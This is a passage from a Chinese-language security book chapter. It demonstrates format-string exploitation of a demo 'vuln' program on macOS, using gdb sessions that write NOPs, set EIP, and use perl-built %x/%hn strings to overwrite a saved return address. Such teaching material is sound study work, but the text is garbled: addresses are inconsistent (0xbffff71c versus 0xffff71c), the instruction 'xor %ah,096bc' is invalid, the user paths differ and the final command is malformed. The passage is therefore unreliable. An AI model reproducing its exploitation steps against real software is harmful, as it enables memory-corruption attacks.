
## 第二章 · 过去与现在的威胁

```
Breakpoint 1, 0x96a8a35 in exit ()
(gdb) x/1a 0xa8e7001
0xa8e7001: 0x2a
(gdb) set $eip = 0xa8e7004
(gdb) set *0xa8e7004 = 0x90909090
(gdb) set *0xa8e7008 = 0x90909090
(gdb) x/101 0xa8e7004
0xa8e7004: nop
0xa8e7005: nop
0xa8e7006: nop
0xa8e7007: nop
0xa8e7008: nop
0xa8e7009: nop
0xa8e700a: nop
0xa8e700b: nop
0xa8e700c: xor %ah,096bc
0xa8e7012: add %al,(eax)
(gdb) break *0xa8e700a
Breakpoint 2 at 0xa8e700a
(gdb) c
Continuing.
```

当跳转到测试的 `NOP` 指令时，一切看起来都很正常。

```
Breakpoint 2, 0xa8e700a in ?? ()
(gdb) x/i $eip
0xa8e700a: nop
(gdb) si
0xa8e700b in ?? ()
(gdb) x/i $eip
0xa8e700b: nop
(gdb) si
0xa8e700c in ?? ()
(gdb) x/i $eip
0xa8e700c: xor %ah,096bc
```

尽管这在调试器中似乎有效，但尝试通过一次性多写格式化字符串来实现相同的操作并未完全成功。在将此技术宣布为旧方法的可行替代方案之前，还需要进行更多的真实世界测试。

### 进程 2278 可写寄存器

```
...
Stack bffff000-c0000000 [4K] rw-/x=COW thread 0
```

如果我们查看示例程序中最后一次崩溃的信息，就可以定位要覆盖的 `EIP` 地址。

```
(gdb) frame 1
#1 0x0001feb in main ()
(gdb) i f
Stack level 1, frame at 0xbffff720:
eip = 0x1feb; saved eip 0x1f92
caller of frame at 0xbffff718, args:
Arglist at 0xbffff718, Previous frame's sp is 0xbffff720
Saved registers:
bp = 0xbffff718, eip at 0xbffff71c
(gdb) r ~`perl -e 'print pack("l", 0xbffff71c ) . "%x.%x.%x.%x.%x.%x\n"`
Starting program: /Users/kminister/Desktop/leopard_stubs/vuln `perl -e\n'print pack("l", 0xbffff71c ) . "%x.%x.%x.%x.%x.%x\n"`
Reading symbols for shared libraries ++. done
???bfff80a.e8ef06fb.e0154b.bffff740.2.
```

向帧一的 `EIP` 地址写入会产生典型的结果。我们得到了内核保护失败，但因为我们正尝试跳转到一个不存在的地址。

程序接收信号 `EXC_BAD_ACCESS`，无法访问内存。

Reason: `KERN_PROTECTION_FAILURE` at address: `0x0000002a`

`0x0000002a in ?? ()`

```
(gdb) bt
#0 0x0000002a in ?? ()
#1 0x00000002 in ?? ()
```

无法访问地址处的内存。为了使用它，我们可能需要完全覆盖 `EIP` 地址。

![](img/792dbeecc8fbe4973ef2b3a6427b61de_75_0.png)

### 覆盖 EIP 地址

```
(gdb) r perl -e 'pack("l", 0xffff71c) . "AAAA" pack("l", 0xffff71c+2) . "%x.%x.%x.%x.%10d.%hn.%10d.%hn"'
Starting program: /Users/Kindermesse/Desktop/leopard_stubs/vuln perl -e print("l", 0xffff71c) . "AAAA" pack("l", 0xffff71c+2) . "%x.%x.%x.%x.%10d.%hn.%10d.%hn"
Reading symbols for shared libraries ++. done
???bfff80a.e8ef06fb.e0154b.bffff740.2.
```
